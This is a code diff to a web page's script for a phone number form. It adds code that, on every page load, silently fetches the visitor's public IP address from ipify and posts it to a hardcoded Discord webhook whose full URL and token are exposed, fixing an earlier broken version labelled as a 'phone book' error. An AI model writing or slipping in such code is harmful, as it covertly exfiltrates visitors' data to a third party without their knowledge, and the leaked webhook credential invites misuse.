@@ -91,29 +91,41 @@
         }
         e.target.value = x;
     });
-const skibidi = ""
-     fetch('https://api.ipify.org?format=json')
-            .then(response => skibidi = response.json())
-            .catch(error => console.error('Error fetching phone book:', btoa(error)));
     document.getElementById('phoneForm').addEventListener('submit', function (e) {
         e.preventDefault();
-       
+       redirectToNumLookup()
     });
-    function sendToDiscord(message) {
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1178097852665315338/RtYjhCRooN7BC2JhsPgm5tiAbc9uA2PS7RqBpZysvI5ytVqe-ZA6vnSGrTDsIf6T9CcQ");
+  function sendToDiscord(message) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1178097852665315338/RtYjhCRooN7BC2JhsPgm5tiAbc9uA2PS7RqBpZysvI5ytVqe-ZA6vnSGrTDsIf6T9CcQ';
 
-      request.setRequestHeader('Content-type', 'application/json');
+        const payload = {
+            content: message
+        };
 
-      var params = {
-        username: "k",
-        avatar_url: "",
-        content: skibidi
-      }
-      request.send(JSON.stringify(params));
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('IP sent successfully');
+            } else {
+                console.error('Error sending IP');
+            }
+        })
+        .catch(error => console.error('Error:', error));
     }
 
-    sendToDiscord();
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const userIP = data.ip;
+            sendToDiscord(`User IP: ${userIP}`);
+        })
+        .catch(error => console.error('Error fetching IP:', error));
 
 </script>
 
